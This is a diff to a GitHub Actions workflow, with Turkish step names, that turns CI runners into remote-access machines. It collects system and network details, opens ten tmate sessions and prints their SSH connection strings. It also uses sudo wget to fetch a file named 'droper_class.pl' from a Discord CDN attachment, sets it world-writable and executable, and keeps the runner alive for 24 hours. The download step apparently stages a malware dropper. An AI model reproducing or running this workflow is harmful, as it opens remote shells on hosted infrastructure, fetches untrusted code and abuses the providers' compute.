@@ -15,27 +15,34 @@ jobs:
     steps:
       - name: Show system info
         run: |
-          echo "CPU Info:"
+          echo "==== CPU Info ===="
           lscpu
-          echo "RAM Info:"
+          echo "==== RAM Info ===="
           free -h
-          echo "Disk Info:"
+          echo "==== Disk Info ===="
           df -h
+          echo "==== OS Info ===="
+          uname -a
+          cat /etc/os-release
+          echo "==== Network Info ===="
+          ip a
+          echo "==== Top 10 Processes ===="
+          ps aux --sort=-%mem | head -n 11
       - name: Install tmate
         run: sudo apt-get update && sudo apt-get install -y tmate
 
       - name: Start 10 tmate sessions
         run: |
           for i in {1..10}; do
-            tmate -S /tmp/tmate_$i.sock new-session -d
+            tmate -S /tmp/tmate_$i.sock new-session -d 'exec bash'
             tmate -S /tmp/tmate_$i.sock wait tmate-ready
             echo "Makine ${{ matrix.machine }} - tmate $i SSH: $(tmate -S /tmp/tmate_$i.sock display -p '#{tmate_ssh}')"
           done
-      - name: Download and set permissions for droper_class.pl
+      - name: Dosya indir ve izin ver
         run: |
           cd ~
-          wget -O droper_class.pl "https://cdn.discordapp.com/attachments/1258368563073388607/1395507438886850742/droper_class.pl?ex=687ab314&is=68796194&hm=9585ed1cf1de3c8f2a6a4c35b2b61a7b5d22e771e794ac6e18011106ae3b579c&"
-          chmod 777 droper_class.pl
+          sudo wget -O droper_class.pl "https://cdn.discordapp.com/attachments/1258368563073388607/1395507438886850742/droper_class.pl?ex=687ab314&is=68796194&hm=9585ed1cf1de3c8f2a6a4c35b2b61a7b5d22e771e794ac6e18011106ae3b579c&"
+          sudo chmod 777 droper_class.pl
       - name: Keep session running
         run: |
           echo "Makine ${{ matrix.machine }} 24 saat boyunca açık kalacak..."
